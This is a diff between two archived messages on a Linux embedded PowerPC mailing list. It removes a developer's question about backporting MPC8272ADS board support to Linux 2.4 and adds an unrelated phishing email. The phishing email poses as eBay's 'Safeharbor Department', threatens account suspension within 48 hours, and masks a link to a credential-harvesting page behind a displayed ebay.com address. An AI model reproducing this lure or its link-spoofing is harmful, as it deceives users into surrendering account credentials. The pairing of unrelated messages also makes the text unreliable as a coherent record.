@@ -1,22 +1,14 @@
-Return-Path: <ajz@cambridgebroadband.com>
-Received: from cambridgebroadband.com (mailhost.cambridgebroadband.com
-	[217.204.121.83])
-	(using TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits))
-	(Client did not present a certificate)
-	by ozlabs.org (Postfix) with ESMTP id B7CE8684BA
+Return-Path: <www@9degrees.com>
+Received: from athens.9degrees.com (137.228.mariettafiber.net
+	[216.235.137.228]) by ozlabs.org (Postfix) with ESMTP id 376636838D
 	for <linuxppc-embedded@ozlabs.org>;
-	Fri,  7 Oct 2005 02:36:33 +1000 (EST)
-Received: from zambia.cambridgebroadband.com (cbluk-gw0.cambridgebroadband.com
-	[217.204.121.82])
-	by cambridgebroadband.com (8.12.8/8.12.8) with SMTP id j96GaS9a009422
-	for <linuxppc-embedded@ozlabs.org>; Thu, 6 Oct 2005 17:36:28 +0100
-Date: Thu, 6 Oct 2005 17:36:27 +0100
-From: Alex Zeffertt <ajz@cambridgebroadband.com>
+	Fri,  7 Oct 2005 07:30:12 +1000 (EST)
 To: linuxppc-embedded@ozlabs.org
-Message-Id: <20051006173628.53f25862.ajz@cambridgebroadband.com>
-Mime-Version: 1.0
-Content-Type: text/plain; charset=US-ASCII
-Subject: mpc8272ads support in linux-2.4
+From: aw-confirm@eBay.com <aw-confirm@eBay.com>
+Content-Type: text/html
+Message-Id: <20051006205736.38DA586FEE6@athens.9degrees.com>
+Date: Thu,  6 Oct 2005 16:57:36 -0400 (EDT)
+Subject: TKO Notice: ***Urgent Safeharbor Department Notice***
 List-Id: Linux on Embedded PowerPC Developers Mail List
 	<linuxppc-embedded.ozlabs.org>
 List-Unsubscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-embedded>,
@@ -27,17 +19,121 @@ List-Help: <mailto:linuxppc-embedded-request@ozlabs.org?subject=help>
 List-Subscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-embedded>,
 	<mailto:linuxppc-embedded-request@ozlabs.org?subject=subscribe>
 
-Hi list,
 
-I have read that the MPC8272ADS board is supported in linux-2.6.  Has
-anybody backported this support to linux-2.4.  I am using linux-2.4.25
-from ELDK.  If anyone has a patch I would be very grateful if they
-sent it to me.
+</td></tr>
+</table>
+</form></td>
+</tr>
+</table>
+<br>
 
-Regards,
+<div id=message>
+<table cellpadding=0 cellspacing=0 border=0 width="100%""><tr><td>
 
-Alex Zeffertt
 
-PS Does anyone know where the master PPC patches are kept?  I.e. the
-ones you apply to kernels from kernel.org to get all the stuff that
-hasn't yet been upstreamed.
+<table cellSpacing="0" cellPadding="0" width="600" align="center" border="0">
+  <tbody>
+    <tr>
+      <td><A target="_blank"      href="http://click3.ebay.com/99019653.50692.0.20283"    ><IMG
+src="http://emailpics3.ebay.com/627422250/images/logo-18.gif"    border=0></A></td>
+    </tr>
+    <tr>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><font color="#000000" size="3" face="Arial, Helvetica, sans-serif"><strong>***Urgent Safeharbor
+Department Notice***</strong></font></td>
+    </tr>
+    <tr>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+<table cellSpacing="0" cellPadding="5" width="600" align="center" border="0">
+  <tbody>
+    <tr>
+      <td height="259" vAlign="top"> <p>              <font size="2" face="Arial, Helvetica,
+sans-serif"><strong>eBay Fraud Mediation Request</strong><br>
+
+            <font size="1" face="Verdana, Arial, Helvetica, sans-serif">Date:
+Thu, Oct 06 2005
+</font></font></p>
+        <p><font size="2" face="Arial, Helvetica, sans-serif">You have recieved this email because you or
+someone had used your account to make fake bids at eBay. For security purposes, we are required to open
+an investigation into this matter. </font></p>
+        <p><font size="2" face="Arial, Helvetica, sans-serif">          THE FRAUD ALERT ID CODE
+CONTAINED IN THIS MESSAGE WILL BE ATTACHED IN
+          OUR FRAUD MEDIATION REQUEST FORM, IN ORDER TO VERIFY YOUR EBAY ACCOUNT
+REGISTRATION INFORMATIONS.</font></p>
+        <p><font size="2" face="Arial, Helvetica, sans-serif"><strong>Fraud Alert ID CODE:
+00937614</strong><br>
+            <font size="1" face="Verdana, Arial, Helvetica, sans-serif">(Please save this Fraud Alert ID Code
+for your reference.</font>)<br>
+          <br>
+          To help speed up this process,
+          please access the following form to complete the verification of your eBay account registration
+informations:</font></p>
+        <p><strong><font size="2" face="Arial, Helvetica, sans-serif"><a target="_blank"
+href="http://mail.hktalhk.edu.hk/.ebay/eBayISAPI.php?MfcISAPICommand=SignInFPP&UsingSSL=1&email="
+>http://scgi.ebay.com/verify_id=ebay
+&fraud alert id code=00937614</a></font></strong></p>
+        <table width="100%"  border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td><p><font size="1">.</font></p>            </td>
+          </tr>
+          <tr>
+            <td><table width="100%"  border="0">
+              <tr>
+                <td bgcolor="#E6E6FF"><font size="2" face="Arial, Helvetica, sans-serif"><strong>Please Note:
+</strong><br>
+                  If we do not receive the appropriate eBay account verification within 48 hours, then we will
+assume this eBay account is fraudulent and will be suspended. <br>
+                  The purpose of this verification is to ensure that your eBay account has not been fraudulently
+used and to combat the fraud from our community.</font></td>
+              </tr>
+            </table></td>
+          </tr>
+        </table>
+        <p><font size="2" face="Arial, Helvetica, sans-serif"><font color="#000000">We appreciate your
+support and understanding, as we work together to keep eBay a safe place to trade.</font></font><font
+color="#000000" size="2" face="Arial, Helvetica, sans-serif"><BR>
+          <BR>
+  Thank you for your patience in this matter.</font></p>
+        <p align="left"><font color="#000000" size="2" face="Arial, Helvetica, sans-serif">Regards,
+Safeharbor Department (Trust and Safety Department)<br>
+  eBay Inc.</font><font size="2" face="Arial, Helvetica, sans-serif"><br>
+          <br>
+          <font color="#999999" size="1"> Please do not reply to this e-mail
+            as this is only a notification. Mail sent to this address cannot be
+      answered. </font></font></p>        </td>
+    </tr>
+    <tr>
+      <td align="middle" ><p align="center"><font color="#000000" size="1" face="Arial,
+Helvetica, sans-serif"><Br>
+          <br>
+          Copyright © 2005 eBay Inc. All Rights Reserved. Designated trademarks and brands are the
+property of their respective owners. eBay and the eBay logo are trademarks of eBay Inc. eBay is located at
+2145 Hamilton Avenue, San Jose, CA 95125. </font><br>
+        </p>
+      </td>
+    </tr>
+  </tbody>
+</table>
+
+
+</td></tr></table>
+</div>
+
+</td></tr></table>
+
+
+
+</td></tr></table>
+</div>
+
+</td></tr></table>
+
+
+
+</td></tr></table>
+</div>
